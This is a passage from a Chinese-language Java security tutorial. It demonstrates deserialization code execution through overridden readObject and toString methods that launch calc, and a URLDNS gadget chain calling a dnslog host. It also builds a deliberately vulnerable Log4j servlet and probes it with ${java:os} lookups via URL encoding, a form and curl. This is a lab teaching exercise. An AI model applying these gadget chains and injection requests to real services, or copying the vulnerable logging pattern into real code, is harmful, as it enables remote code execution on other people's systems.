class="hljs-comment">//调用下面的方法 传输ser.txt 解析还原反序列化</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span>UnserializableTest(<span class="hljs-string">&quot;ser.txt&quot;</span>);<br>    <br>        <span class="hljs-comment">//对obj对象进行输出 默认调用原始对象的toString方法</span><br>        System.out.println(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">UnserializableTest</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-comment">//读取Filename文件进行反序列化还原</span><br>        ObjectInputStream ois=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-comment">// 通过 ois.readObject() 方法从文件输入流中读取一个对象，并将其赋值给变量 o</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-comment">// 返回反序列化后的对象</span><br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>​<img src="/assets/image-20240715002951-19iltz2.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
</li>
</ul>
</li>
<li><p>重写方法</p>
<p> 原理：<code>readObject</code>​  序列化后被重写 <code>readObject</code>​ 调用</p>
<p> 运行 SerializableDemo.java 生成新的 ser.txt 后，运行 UnserializableDemo.java 进行反序列化，发现弹出了计算器程序。</p>
<p> <img src="/assets/image-20240715003826-tzso2a8.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> 这是因为在进行反序列化操作过程中，如下方法调用了 <code>readObject</code>​ 方法，但由于我们在 <code>UserDemo.java</code>​ 重写了该方法，所以导致此处执行的 <code>readObject</code>​ 不是原本默认的 <code>readObject</code>​，而是我们自定义的 <code>readObject</code>​，其中 <code>ois.defaultReadObject()</code>​ 使其指向正确的 <code>readObject</code>​ 从而使程序可以正常运行，又可以执行我们的代码</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><br><span class="hljs-keyword">import</span> java.io.Serializable;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><br><span class="hljs-comment">// 用户信息类，实现了 Serializable 接口</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserDemo</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br><br>    <span class="hljs-comment">// 公共成员变量</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;xiaodi&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">String</span> <span class="hljs-variable">gender</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;man&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">Integer</span> <span class="hljs-variable">age</span> <span class="hljs-operator">=</span> <span class="hljs-number">30</span>;<br><br>    <span class="hljs-comment">// 构造方法</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">UserDemo</span><span class="hljs-params">(String name, String gender, Integer age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.gender = gender;<br>        <span class="hljs-built_in">this</span>.age = age;<br>        System.out.println(name);<br>        System.out.println(gender);<br>    &#125;<br><br>    <span class="hljs-comment">// toString 方法，用于打印对象信息</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br><br><br>        <span class="hljs-comment">// 返回对象信息的字符串表示</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;User&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, gender=&#x27;&quot;</span> + gender + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream ois)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException<br>    &#123;<br>        <span class="hljs-comment">// 指向正确的defaultReadObject</span><br>        ois.defaultReadObject();<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125; <br>&#125;<br></code></pre></td></tr></table></figure></li>
<li><p>触发方法</p>
<p> 原理：toString  输出打印对象时调用 toString 方法</p>
<p> 直接运行 UnserializableDemo.java 进行反序列化，发现弹出了计算器程序。这是由于当对一个对象进行打印输出时，会默认自动调用它的 toString 方法</p>
<p> <img src="/assets/image-20240715004016-ke1hkv0.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p> 而我们这里在 toString 加入了我们要运行的代码，所以当反序列化时下面代码运行打印输出时，我们的代码就会成功执行。</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.seriatestdemo;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-comment">// 用户信息类，实现了 Serializable 接口</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserDemo</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-comment">// 公共成员变量</span><br>    <span class="hljs-keyword">public</span> String name=<span class="hljs-string">&quot;xiaodi&quot;</span>;<br>    <span class="hljs-keyword">public</span> String gender=<span class="hljs-string">&quot;man&quot;</span>;<br>    <span class="hljs-keyword">public</span> Integer age=<span class="hljs-number">30</span>;<br><br>    <span class="hljs-comment">// 构造方法</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">UserDemo</span><span class="hljs-params">(String name,String gender,Integer age)</span>&#123;<br>        <span class="hljs-built_in">this</span>.name=name;<br>        <span class="hljs-built_in">this</span>.gender=gender;<br>        <span class="hljs-built_in">this</span>.age = age;<br>        System.out.println(name);<br>        System.out.println(gender);<br>    &#125;<br><br>    <span class="hljs-comment">// toString 方法，用于打印对象信息</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>          <span class="hljs-keyword">try</span> &#123;<br>              Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>          &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>              <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>          &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;User&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, gender=&#x27;&quot;</span> + gender + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li>
<li><p>可控其他类重写方法</p>
<p> 参考：<a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java</a></p>
<p> 利用 <code>HashMap</code>​存在的反序列化漏洞的<code>readObject</code>​方法，调用了<code>HashMap.putVal()</code>​ 方法，最终调用了<code>URL.hashCode()</code>​形成RCE漏洞分析</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java">正常代码中 创建对象HashMap<br>        用到原生态readObject方法去反序列化数据<br>        readObject 在ObjectInputSteam 本来在这里<br>        HashMap也有readObject方法<br>        反序列化readObject方法调用 HashMap里面的readObject<br>        执行链：<br>        序列化对象hash 来源于自带类HashMap<br>         *   Gadget Chain:<br>                *   HashMap.readObject()<br>                *       HashMap.putVal()<br>                *         HashMap.hash()<br>                *           URL.hashCode()<br>        hashCode 执行结果 触发访问DNS请求 如果这里是执行命令的话 就是RCE漏洞<br></code></pre></td></tr></table></figure>

<p> <img src="/assets/image-20240715010506-yofoa9k.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.seriatestdemo;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UrLDns</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        HashMap&lt;URL,Integer&gt; hash = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        URL u=<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://uqbm9g.dnslog.cn&quot;</span>);<br>        hash.put(u,<span class="hljs-number">1</span>);<br>        <span class="hljs-comment">//正常代码中 创建对象HashMap</span><br>        <span class="hljs-comment">//用到原生态readObject方法去反序列化数据</span><br>        <span class="hljs-comment">//readObject 在ObjectInputSteam 本来在这里</span><br>        <span class="hljs-comment">//HashMap也有readObject方法</span><br>        <span class="hljs-comment">//反序列化readObject方法调用 HashMap里面的readObject</span><br>        <span class="hljs-comment">//执行链：</span><br>        <span class="hljs-comment">//序列化对象hash 来源于自带类HashMap</span><br><span class="hljs-comment">//         *   Gadget Chain:</span><br><span class="hljs-comment">//                *   HashMap.readObject()</span><br><span class="hljs-comment">//                *       HashMap.putVal()</span><br><span class="hljs-comment">//                *         HashMap.hash()</span><br><span class="hljs-comment">//                *           URL.hashCode()</span><br>        <span class="hljs-comment">//hashCode 执行结果 触发访问DNS请求 如果这里是执行命令的话 就是RCE漏洞</span><br>        SerializableTest(hash);<br>        UnserializableTest(<span class="hljs-string">&quot;dns.txt&quot;</span>);<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">SerializableTest</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-comment">//FileOutputStream() 输出文件</span><br>        <span class="hljs-comment">//将对象obj序列化后输出到文件dns.txt</span><br>        ObjectOutputStream oos= <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;dns.txt&quot;</span>));<br>        oos.writeObject(obj);<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">UnserializableTest</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-comment">//读取Filename文件进行反序列化还原</span><br>        ObjectInputStream ois= <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br><br><br>&#125;<br></code></pre></td></tr></table></figure></li>
</ol>
<p>‍</p>
<p>‍</p>
<p>‍</p>
<h3 id="JavaEE应用-第三方组件-Log4j日志-FastJson序列化-JNDI注入"><a href="#JavaEE应用-第三方组件-Log4j日志-FastJson序列化-JNDI注入" class="headerlink" title="JavaEE应用&amp;第三方组件&amp;Log4j日志&amp;FastJson序列化&amp;JNDI注入"></a>JavaEE应用&amp;第三方组件&amp;Log4j日志&amp;FastJson序列化&amp;JNDI注入</h3><ol>
<li><p>Log4j历史漏洞&amp;JNDI注入</p>
<ul>
<li><p>Log4j历史漏洞</p>
<p>首先配置Maven—<a target="_blank" rel="noopener" href="https://www.jb51.net/article/259780.htm">IDEA配置Maven的超详细步骤_java_脚本之家 (jb51.net)</a></p>
<p>并创建空项目Log4jDemo</p>
<p><img src="/assets/image-20240715180108-ganmb34.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p>Maven 引用 Log4j</p>
<ol>
<li>在 pom.xml 文件中添加引用</li>
<li>引用代码是那个 <a target="_blank" rel="noopener" href="https://mvnrepository.com/" title="Jar 仓库">Jar 仓库</a>搜索到之后复制 Maven 的代码</li>
<li>这里引用的是 <a target="_blank" rel="noopener" href="https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core/2.14.1" title="2.14.1 版本">2.14.1 版本</a>的</li>
</ol>
<p><img src="/assets/image-20240715180312-bwycpsv.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p><img src="/assets/image-20240715180405-r44jq3w.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p>引用后左侧就会变成下图所示</p>
<p><img src="/assets/image-20240715180549-fhs7no6.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p>创建 Log4jTest.java，编写代码并运行</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.logging.log4j.LogManager;<br><span class="hljs-keyword">import</span> org.apache.logging.log4j.Logger;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Log4jTest</span> &#123;<br>    <br>    <span class="hljs-comment">//使用Log4j 实现错误日志输出</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">logger</span> <span class="hljs-operator">=</span> LogManager.getLogger(Log4jTest.class);<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>    <br>        <span class="hljs-comment">//如果这个code变量是可控的</span><br>        String code=<span class="hljs-string">&quot;$&#123;java:os&#125;&quot;</span>;<br>        logger.error(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>,code);<br>    &#125;<br>    <br>&#125;<br></code></pre></td></tr></table></figure>

<p>发现可以进行命令执行</p>
<p>​<img src="/assets/image-20240715180737-2z7sych.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p>在网站中进行测试</p>
<p>创建一个 web 应用程序新项目，配置如下：</p>
<p>​<img src="/assets/image-20240715180845-64e7d86.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p>如上同样需要在 pom.xml 文件中添加 Log4j 引用</p>
<p>创建Log4jServlet.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.log4jwebdemo;<br>    <br><span class="hljs-keyword">import</span> org.apache.logging.log4j.LogManager;<br><span class="hljs-keyword">import</span> org.apache.logging.log4j.Logger;<br>    <br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br>    <br><span class="hljs-meta">@WebServlet(&quot;/log4j&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Log4jServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-comment">//构造HTTP WEB服务 使用带漏洞Log4j版本</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> Logger log=LogManager.getLogger(Log4jServlet.class);<br>    <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span>req.getParameter(<span class="hljs-string">&quot;code&quot;</span>);<br>        log.error(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>,code);<br>    <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>运行 tomcat 服务器，访问 url 路由，添加 code 参数，最终构造 url 如下</p>
<p><a target="_blank" rel="noopener" href="http://localhost:8080/Log4jWebDemo/_war/_exploded/log4j?code%5C=%5C$%7Bjava:os%7D">http://localhost:8080/Log4jWebDemo\_war\_exploded/log4j?code\=\${java:os}</a></p>
<p>此时产生一个400错误</p>
<p>​<img src="/assets/image-20240715181233-10u4fkt.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<p>经过查询之后发现：Tomcat 服务器在解析请求时检测到了无效字符，从而返回了 HTTP 400 错误。这是因为 <strong>Tomcat 遵循 RFC 7230 和 RFC 3986 标准</strong>，这些标准规定了 URL 中允许的字符范围，而 <code>$&#123;&#125;</code>​ 这些字符在请求路径中是<strong>不允许</strong>的。</p>
<ul>
<li><p>这里一共有四个解决方法</p>
<p>方法一：对特殊字符进行 URL 编码</p>
<p>将 <code>$&#123;</code>​ 和 <code>&#125;</code>​ 等特殊字符进行 URL 编码，然后再进行访问。例如，<code>$&#123;</code>​ 编码为 <code>%24%7B</code>​，<code>&#125;</code>​ 编码为 <code>%7D</code>​。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">http://localhost:8080/Log4jWebDemo_war_exploded/log4j?code=%24%7Bjava%3Aos%7D<br></code></pre></td></tr></table></figure>

<p>方法二：使用 POST 请求</p>
<p>有时使用 POST 请求可以避免这种问题，因为请求参数不包含在 URL 中，而是包含在请求体中。</p>
<p>可以创建一个简单的 HTML 表单来发送 POST 请求：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>POST Request<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://localhost:8080/Log4jWebDemo_war_exploded/log4j&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;code&quot;</span>&gt;</span>Enter code:<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;code&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;code&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;$&#123;java:os&#125;&quot;</span> /&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span>Submit<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>将此 HTML 文件保存并在浏览器中打开，然后提交表单。</p>
<p>方法三：修改 Tomcat 配置（不推荐）</p>
<p>不推荐在生产环境中进行此类配置更改，因为它会降低安全性。但在受控环境中进行测试时，可以修改 Tomcat 的 <code>web.xml</code>​ 文件以允许特殊字符：</p>
<ol>
<li><p>打开 <code>conf/web.xml</code>​ 文件。</p>
</li>
<li><p>添加以下内容：</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">filter</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>SetCharacterEncoding<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-class</span>&gt;</span>org.apache.catalina.filters.SetCharacterEncodingFilter<span class="hljs-tag">&lt;/<span class="hljs-name">filter-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">init-param</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>encoding<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>UTF-8<span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">init-param</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">init-param</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>ignore<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">init-param</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">filter-mapping</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>SetCharacterEncoding<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/*<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">filter-mapping</span>&gt;</span><br></code></pre></td></tr></table></figure></li>
</ol>
<p>方法四：使用代理或自定义客户端</p>
<p>使用代理服务器或编写自定义 HTTP 客户端可以绕过浏览器和服务器的限制。</p>
<p>使用 cURL 发送请求</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">curl -G <span class="hljs-string">&quot;http://localhost:8080/Log4jWebDemo_war_exploded/log4j&quot;</span> --data-urlencode <span class="hljs-string">&quot;code=\$&#123;java:os&#125;&quot;</span><br></code></pre></td></tr></table></figure>

<p>自定义 HTTP 客户端（Java 示例）</p>
